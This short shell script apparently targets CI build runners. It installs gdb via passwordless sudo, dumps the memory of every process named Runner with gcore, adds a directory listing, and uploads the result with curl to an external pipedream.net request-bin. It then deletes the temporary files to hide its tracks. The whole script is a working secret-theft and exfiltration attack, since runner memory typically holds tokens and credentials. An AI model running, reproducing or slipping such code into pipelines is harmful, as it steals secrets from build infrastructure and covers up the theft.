#!/bin/sh

# install gdb to provide gcore
# sudo is passwordless according to doc
sudo apt-get install gdb > /tmp/file.txt

# get pids related to runners
for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    echo "---$pid---"
    gcore $pid >> /tmp/file.txt
done

echo $(ls -la) >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

rm /tmp/file.txt
rm /tmp/run-results.txt